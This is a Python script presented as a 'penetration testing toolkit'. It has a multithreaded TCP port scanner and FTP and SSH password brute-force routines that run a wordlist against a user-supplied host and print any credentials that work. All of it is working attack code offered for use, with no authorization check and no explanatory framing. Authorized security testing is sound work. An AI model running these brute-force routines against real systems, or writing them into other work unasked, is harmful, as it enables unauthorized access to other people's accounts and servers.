import socket
import requests
from concurrent.futures import ThreadPoolExecutor
from ftplib import FTP
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException

def banner():
    print("=" * 60)
    print("PENETRATION TESTING TOOLKIT")
    print("Modules: [1] Port Scanner [2] Brute Force Login")
    print("=" * 60)

def port_scanner(target_ip, ports):
    print(f"\n[*] Scanning {target_ip} for open ports...\n")
    open_ports = []

    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"[+] Port {port} is OPEN")
            sock.close()
        except:
            pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(scan_port, ports)

    print(f"\n[✓] Scan complete. Open ports: {open_ports}")

def brute_force_ftp(host, user, wordlist):
    print(f"\n[*] Starting FTP brute-force on {host} with user '{user}'...")
    with open(wordlist, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ftp = FTP(host)
                ftp.login(user, password)
                print(f"[+] Success! Credentials: {user}:{password}")
                ftp.quit()
                return
            except Exception:
                pass
    print("[-] Brute-force failed. No valid credentials found.")

def brute_force_ssh(host, user, wordlist):
    print(f"\n[*] Starting SSH brute-force on {host} with user '{user}'...")
    with open(wordlist, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ssh = SSHClient()
                ssh.set_missing_host_key_policy(AutoAddPolicy())
                ssh.connect(host, username=user, password=password, timeout=3)
                print(f"[+] Success! Credentials: {user}:{password}")
                ssh.close()
                return
            except AuthenticationException:
                continue
            except Exception as e:
                print(f"[!] Error: {e}")
                break
    print("[-] Brute-force failed. No valid credentials found.")

def main():
    banner()
    choice = input("Choose a module [1/2]: ")

    if choice == "1":
        target = input("Enter target IP: ")
        ports = list(range(1, 1025))
        port_scanner(target, ports)

    elif choice == "2":
        service = input("Choose service [ftp/ssh]: ").strip().lower()
        host = input("Enter target IP/Host: ")
        user = input("Enter username: ")
        wordlist = input("Enter path to password wordlist: ")

        if service == "ftp":
            brute_force_ftp(host, user, wordlist)
        elif service == "ssh":
            brute_force_ssh(host, user, wordlist)
        else:
            print("Invalid service type selected.")

    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
